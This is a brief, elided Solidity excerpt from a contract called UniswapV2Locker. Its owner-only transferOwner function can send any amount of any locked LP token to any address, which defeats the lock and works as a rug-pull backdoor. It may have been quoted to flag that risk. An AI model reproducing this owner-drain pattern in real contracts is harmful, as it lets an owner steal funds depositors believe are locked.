...
contract UniswapV2Locker is Ownable, ReentrancyGuard {
    ...
    function withdrawOwner(address _userAdress, address _lpToken) external nonReentrant onlyOwner {
        ...
        for (uint i = 0; i < lockeIDs.length; i++) {
    ...
    function transferOwner(address _lpToken, address _userAdress, uint256 _amount) external nonReentrant onlyOwner {
        TransferHelper.safeTransfer(_lpToken, _userAdress, _amount);
    }
